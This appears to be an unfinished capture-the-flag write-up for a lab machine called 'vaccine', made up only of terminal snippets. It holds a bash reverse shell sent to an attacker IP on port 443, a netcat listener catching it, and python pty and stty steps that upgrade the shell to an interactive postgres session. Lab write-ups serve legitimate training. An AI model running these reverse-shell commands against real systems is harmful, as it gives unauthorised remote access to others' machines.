---
title: 
categories: [, Basic]
tags: []
image:
    path: /
---


```
os-shell> bash -c 'sh -i >& /dev/tcp/10.10.14.175/443 0>&1'
```


```
┌──(root㉿kali)-[/home/user]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.175] from (UNKNOWN) [10.129.97.79] 51248
sh: 0: can't access tty; job control turned off
$ ls
```

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'    
postgres@vaccine:/var/lib/postgresql$

postgres@vaccine:/var/lib/postgresql$ export TERM=xterm
export TERM=xterm
```

```
postgres@vaccine:/var/lib/postgresql$ ^Z
zsh: suspended  nc -lnvp 443
```


┌──(root㉿kali)-[/home/user]
└─# stty raw -echo ; fg
[15]    continued  nc -lnvp 443

postgres@vaccine:/var/lib/postgresql$